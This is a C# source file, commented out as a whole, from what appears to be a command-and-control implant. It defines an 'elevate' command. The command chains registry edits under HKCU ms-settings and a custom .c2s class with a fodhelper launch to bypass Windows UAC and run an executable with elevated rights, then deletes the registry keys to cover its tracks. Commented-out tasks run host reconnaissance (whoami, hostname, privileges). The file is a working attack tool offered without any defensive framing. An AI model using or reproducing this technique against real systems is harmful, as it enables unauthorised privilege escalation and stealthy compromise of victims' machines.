/*using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Commands
{
    internal class ElevateCommand : CompositeCommand
    {
        public override string Name => "elevate";

        public ElevateCommand()
        {
            this.RegisterTask(new Models.AgentTask()
            {
                Id = new Guid().ToString(),
                Command = "shell",
                Arguments = "reg add \"HKCU\\Software\\Classes\\.c2s\\Shell\\Open\\command\" /d \"c:\\users\\olivier\\upd.exe\" /f"
            });
            this.RegisterTask(new Models.AgentTask()
            {
                Id = new Guid().ToString(),
                Command = "shell",
                Arguments = "reg add \"HKCU\\Software\\Classes\\ms-settings\\CurVer\" /d \".c2s\" /f"
            });
            this.RegisterTask(new Models.AgentTask()
            {
                Id = new Guid().ToString(),
                Command = "shell",
                Arguments = "fodhelper"
            });
            this.RegisterTask(new Models.AgentTask()
            {
                Id = new Guid().ToString(),
                Command = "powershell",
                Arguments = "Remove-Item Registry::HKCU\\Software\\Classes\\.c2s -Recurse  -Force"
            });

            this.RegisterTask(new Models.AgentTask()
            {
                Id = new Guid().ToString(),
                Command = "powershell",
                Arguments = "Remove-Item Registry::HKCU\\Software\\Classes\\ms-settings\\CurVer -Recurse  -Force"
            });


            //this.RegisterTask(new Models.AgentTask()
            //{
            //    Id = new Guid().ToString(),
            //    Command = "shell",
            //    Arguments = "whoami"
            //});

            //this.RegisterTask(new Models.AgentTask()
            //{
            //    Id = new Guid().ToString(),
            //    Command = "whoami",
            //});

            //this.RegisterTask(new Models.AgentTask()
            //{
            //    Id = new Guid().ToString(),
            //    Command = "shell",
            //    Arguments = "hostname"
            //});

            //this.RegisterTask(new Models.AgentTask()
            //{
            //    Id = new Guid().ToString(),
            //    Command = "shell",
            //    Arguments = "whoami /groups"
            //});
            //this.RegisterTask(new Models.AgentTask()
            //{
            //    Id = new Guid().ToString(),
            //    Command = "shell",
            //    Arguments = "whoami /priv"
            //});
        }
    }
}*/
